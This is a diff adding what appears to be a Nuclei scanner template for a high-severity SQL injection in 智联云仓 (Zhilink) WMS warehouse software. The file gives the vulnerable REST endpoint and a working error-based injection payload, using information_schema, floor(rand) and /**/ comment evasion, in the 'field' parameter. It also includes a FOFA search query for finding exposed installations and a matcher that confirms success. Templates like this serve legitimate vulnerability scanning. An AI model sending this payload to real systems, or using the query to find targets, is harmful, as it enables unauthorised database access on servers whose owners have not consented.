@@ -1,0 +1,36 @@
+id: zhilink-wsm-getsyspdaversionlistbyparams-sqli
+info:
+  name: 智联云仓WMS 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59539/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="OrderCollaboration~application~arrival~barcode" || title=="WMS"
+    tips:
+    repair:
+    version:
+  tags: zhilink,sqli
+
+http:
+  - raw:
+      - |
+        POST /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2029.104 Safari/537.36
+        Content-Type: application/json
+        Content-Length: 183
+        Connection: close
+
+        {"condition":{"field":"createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5(573137),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)","order":"asc"},"current":1,"size":1}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'8f0e3cc6e9bd30692959c3841960aeb6')
+        condition: and
